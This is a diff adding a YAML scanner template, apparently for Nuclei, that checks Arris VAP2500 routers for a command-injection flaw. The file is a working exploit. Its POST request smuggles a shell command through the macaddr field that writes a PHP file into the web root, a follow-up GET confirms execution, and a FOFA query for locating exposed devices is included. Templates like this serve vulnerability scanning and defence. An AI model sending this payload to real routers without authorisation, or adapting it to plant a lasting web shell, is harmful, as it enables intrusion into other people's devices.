@@ -1,0 +1,36 @@
+id: arris-vap2500-list_mac_address-rce
+
+info:
+  name: arris-vap2500-list_mac_address-rce
+  author: unknow
+  severity: high
+  description: arris vap2500 list_mac_address 路由器存在命令执行漏洞。
+  tags: arris,rce
+  metadata:
+    fofa-qeury: body="./images/lg_05_1.gif"
+    veified: true
+    max-request: 1
+
+http:
+  - raw:
+      - |              
+        POST /list_mac_address.php HTTP/1.1
+        Host: 
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 
+
+        macaddr=00%3A00%3A44%3A00%3A00%3A00%3Becho+%27%3C%3Fphp+%40error_reporting%280%29%3Becho+%229DCB02DBCed39C2E%22%3Bunlink%28__FILE__%29%3B%3F%3E%27+%3E+%2Fvar%2Fwww%2F{{filename}}&action=0&settype=1
+      - |              
+        GET /{{filename}} HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0 
+
+    payloads:
+      filename:
+        - "233.php"
+               
+    matchers:     
+      - type: dsl
+        name: rce
+        dsl:
+          - "status_code_2==200 && contains(body,'9DCB02DBCed39C2E') && contains(header,'text/html')" 
